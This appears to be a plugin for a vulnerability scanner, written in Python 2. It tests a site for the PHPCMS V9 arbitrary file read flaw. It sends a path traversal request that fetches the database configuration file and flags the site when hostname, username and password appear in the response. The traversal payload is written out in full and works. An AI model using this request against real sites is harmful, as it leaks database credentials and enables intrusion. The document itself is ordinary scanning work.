#!/usr/bin/python
# -*- coding: utf-8 -*-
from engine.engine_utils.common import *
from engine.logger import scanLogger as logger

inj_path_list = [
    "/index.php?m=search&c=index&a=public_get_suggest_keyword&url=0&q=../../phpsso_server/caches/configs/database.php"
]


def run_domain(http,ob):
    result_list = []
    try:
        scheme = ob['scheme']
        domain = ob['domain']
        header = {'Host': domain}
        source_ip = ob.get('source_ip')
        if source_ip:
            domain = source_ip
        path = ob.get('path', '/')
        if not path or path[-1] != '/':
            path += '/'
        add_path = "/index.php?m=search&c=index&a=public_get_suggest_keyword&url=0&q=../../phpsso_server/caches/configs/database.php"
        new_url = "%s://%s%s%s" % (scheme, domain, path, add_path)
        res, content = http.request(new_url, "GET", headers=header)
        if re.search(r"(?:hostname)",content,re.I) and re.search(r"(?:password)",content,re.I) \
                and re.search(r"(?:username)",content,re.I):
            detail = "检测到PHPCMS V9 读取任意文件漏洞"
            request = getRequest(new_url, domain=ob['domain'])
            response = getResponse(res,content)
            result_list.append(getRecord(ob, new_url, ob['level'], detail, request=request, response=response, output="", payload=add_path))
        return result_list
    except Exception,e:
        logger.error("File:PhpcmsV9ReadconfigScript_yd.py, run_domain function :%s" % (str(e)))
        return []